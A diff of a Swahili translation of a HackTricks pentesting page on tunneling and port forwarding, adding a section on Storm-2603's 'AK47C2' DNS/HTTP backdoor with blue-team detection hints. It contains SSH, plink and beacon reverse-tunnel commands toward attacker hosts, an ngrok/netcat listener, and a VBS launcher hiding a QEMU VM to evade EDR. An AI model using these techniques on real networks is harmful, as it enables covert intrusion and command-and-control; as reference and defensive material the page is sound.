@@ -2,7 +2,7 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Nmap nasaha
 
 > [!WARNING]
 > **ICMP** na **SYN** skani haziwezekani kupitishwa kupitia socks proxies, hivyo tunapaswa **kuondoa kugundua ping** (`-Pn`) na kubainisha **TCP skani** (`-sT`) ili hii ifanye kazi.
@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Fungua Port mpya kwenye SSH Server --> Port nyingine
+Fungua Bandari Mpya kwenye SSH Server --> Bandari Nyingine
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Porti za ndani --> Kituo kilichoshambuliwa (SSH) --> Sanduku_tatu:Port
+Local port --> Compromised host (SSH) --> Third_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -99,7 +99,7 @@ Kwa mfano, kusambaza trafiki yote inayokwenda 10.10.10.0/24
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Unganisha kwa kutumia ufunguo wa kibinafsi
+Unganisha na ufunguo wa kibinafsi
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Fungua bandari katika server ya timu inayosikiliza kwenye interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
+Fungua bandari katika teamserver inayosikiliza kwenye interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -154,7 +154,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Ili kuzingatia:
+To note:
 
 - Reverse port forward ya Beacon imeundwa ili **kufanya tunnel trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
 - Trafiki **inafanywa tunnel ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Ni kama toleo la console la PuTTY (chaguzi ni sawa na mteja wa ssh).
 
-Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kupeleka tu bandari inayoweza kufikiwa ndani kwa bandari kwenye mashine yetu:
+Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kuhamasisha bandari inayopatikana tu kwa ndani kwa bandari kwenye mashine yetu:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -374,7 +374,7 @@ Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupanua trafi
 
 Unaweza kufanya programu za Windows GUI zipite kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
 Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
-Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupanua na muunganisho kwa IP unazotaka kupanua.
+Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupanua na muunganisho kwa IP ambazo unataka kupanua.
 
 ## NTLM proxy bypass
 
@@ -387,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
-Kwa mfano, hiyo inapeleka bandari 443
+Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo unachokipenda kupitia bandari hii.\
+Kwa mfano, inapeleka bandari 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -397,7 +397,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza katika bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
-Pia unaweza kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.
+Unaweza pia kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.
 
 ## YARP
 
@@ -444,13 +444,47 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Badilisha DNS ya proxychains
+#### Badilisha proxychains DNS
 
-Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupitia socks proxy. Kwa **kawaida** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kuibadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na badilisha IP. Ikiwa uko katika **mazingira ya Windows** unaweza kuweka IP ya **meneja wa kikoa**.
+Proxychains inakamata `gethostbyname` libc call na kupitisha ombi la tcp DNS kupitia socks proxy. Kwa **kawaida** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kuibadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **mazingira ya Windows** unaweza kuweka IP ya **meneja wa kikoa**.
 
 ## Tunnels katika Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
+
+### DNS TXT / HTTP JSON C2 ya Kijadi (AK47C2)
+
+Mchezaji wa Storm-2603 aliumba **C2 ya njia mbili ("AK47C2")** inayotumia *tu* trafiki ya nje ya **DNS** na **plain HTTP POST** – protokali mbili ambazo mara nyingi hazizuiwi kwenye mitandao ya kampuni.
+
+1. **Hali ya DNS (AK47DNS)**
+• Inaunda SessionID ya bahati nasibu yenye herufi 5 (mfano `H4T14`).
+• Inaanza na `1` kwa *maombi ya kazi* au `2` kwa *matokeo* na kuunganisha maeneo tofauti (bendera, SessionID, jina la kompyuta).
+• Kila eneo lina **XOR-kifichwa kwa funguo za ASCII `VHBD@H`**, hex-encoded, na kuunganishwa pamoja na nukta – hatimaye kumaliza na kikoa kinachodhibitiwa na mshambuliaji:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Maombi yanatumia `DnsQuery()` kwa **TXT** (na fallback **MG**) rekodi.
+• Wakati jibu linapozidi 0xFF bytes, backdoor **inavunja** data katika vipande vya 63-byte na kuingiza alama:
+`s<SessionID>t<TOTAL>p<POS>` ili seva ya C2 iweze kuzipanga upya.
+
+2. **Hali ya HTTP (AK47HTTP)**
+• Inajenga envelope ya JSON:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• Blob nzima ni XOR-`VHBD@H` → hex → inatumwa kama mwili wa **`POST /`** na kichwa `Content-Type: text/plain`.
+• Jibu linafuata uandishi sawa na uwanja wa `cmd` unatekelezwa na `cmd.exe /c <command> 2>&1`.
+
+Maelezo ya Blue Team
+• Angalia maombi ya **TXT** yasiyo ya kawaida ambayo lebo yake ya kwanza ni ndefu ya hexadecimal na kila wakati inaishia kwenye kikoa kimoja cha nadra.
+• Funguo ya XOR isiyobadilika ikifuatana na ASCII-hex ni rahisi kugundua kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).
+• Kwa HTTP, flag mwili wa POST wa text/plain ambao ni hex safi na mara nyingi za byte mbili.
+
+{{#note}}
+Kituo chote kinafaa ndani ya **maombi ya kawaida yanayokubaliana na RFC** na kinahifadhi kila lebo ya sub-domain chini ya byte 63, na kuifanya iwe ya siri katika kumbukumbu nyingi za DNS.
+{{#endnote}}
 
 ## ICMP Tunneling
 
@@ -459,7 +493,7 @@ Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupi
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kutunga data kati yao kwa kutumia ombi la ICMP echo.
+Root inahitajika katika mifumo yote ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maombi ya echo ya ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -500,7 +534,7 @@ chmod a+x ./ngrok
 
 **Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._
+_Ipo pia uwezekano wa kuongeza uthibitisho na TLS, ikiwa ni lazima._
 
 #### Tunneling TCP
 ```bash
@@ -510,7 +544,7 @@ _Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Kuonyesha faili kwa HTTP
+#### Kuweka wazi faili kwa HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -578,7 +612,7 @@ Kwa sababu trafiki yote inatoka kwenye mwenyeji **nje kupitia 443**, Cloudflared
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayoshughulikiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya kurudi kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.
+[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayosimamiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya kurudi kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.
 
 ### Classic reverse TCP tunnel
 ```bash
@@ -612,7 +646,7 @@ Amri iliyotajwa hapo juu inachapisha bandari ya mwathirika **8080** kama **attac
 
 ## Tunnels za Siri za VM kwa kutumia QEMU
 
-Mitandao ya hali ya mtumiaji ya QEMU (`-netdev user`) inasaidia chaguo kinachoitwa `hostfwd` ambacho **kinafunga bandari ya TCP/UDP kwenye *host* na kupeleka ndani ya *guest***. Wakati mgeni anapokimbia daemon kamili ya SSH, sheria ya hostfwd inakupa sanduku la kuruka la SSH linaloweza kutumika ambalo linaishi kabisa ndani ya VM ya muda – bora kwa kuficha trafiki ya C2 kutoka EDR kwa sababu shughuli zote mbaya na faili zinabaki kwenye diski ya virtual.
+Mitandao ya hali ya mtumiaji ya QEMU (`-netdev user`) inasaidia chaguo kinachoitwa `hostfwd` ambacho **kinafunga bandari ya TCP/UDP kwenye *host* na kupeleka ndani ya *guest***. Wakati mgeni anapokimbia daemon kamili ya SSH, sheria ya hostfwd inakupa sanduku la jump la SSH linaloweza kutumika ambalo linaishi kabisa ndani ya VM ya muda – bora kwa kuficha trafiki ya C2 kutoka EDR kwa sababu shughuli zote mbaya na faili zinabaki kwenye diski ya virtual.
 
 ### Mstari wa haraka
 ```powershell
@@ -634,7 +668,7 @@ qemu-system-x86_64.exe ^
 Set o = CreateObject("Wscript.Shell")
 o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
 ```
-Kukimbia kwa script na `cscript.exe //B update.vbs` kunashikilia dirisha kuwa fiche.
+Kukimbia kwa skripti na `cscript.exe //B update.vbs` kunashikilia dirisha kuwa fiche.
 
 ### Uthibitisho ndani ya mgeni
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Marejeleo
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
